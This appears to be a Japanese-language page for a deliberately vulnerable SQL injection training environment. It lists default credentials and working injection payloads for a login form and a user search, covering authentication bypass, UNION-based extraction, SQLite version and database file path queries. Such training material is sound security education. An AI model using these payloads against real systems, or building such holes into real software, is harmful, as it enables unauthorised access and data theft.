🔓 SQLインジェクション練習環境

⚠️ このページは学習目的のみで使用してください。実際のアプリケーションではこのような脆弱性を絶対に含めないでください。

1. ログイン機能（SQLインジェクション脆弱性あり）

💡 ヒント:

  • 通常のログイン: admin / password123
  • パスワードを無視する: ユーザー名に admin' OR '1'='1 を入力
  • コメントアウト: ユーザー名に admin' -- を入力（パスワードはなんでもOK）

2. ユーザー検索機能（SQLインジェクション脆弱性あり）

💡 ヒント:

  • 通常の検索: alice
  • すべてのユーザーを取得: ' OR '1'='1
  • UNION攻撃: ' UNION SELECT * FROM users --
  • SQliteのバージョンを取得: ' UNION SELECT sqlite_version(), NULL, NULL, NULL --
  • データベース名を取得: ' UNION SELECT NULL, file, NULL, NULL, NULL FROM pragma_database_list WHERE name='main' --
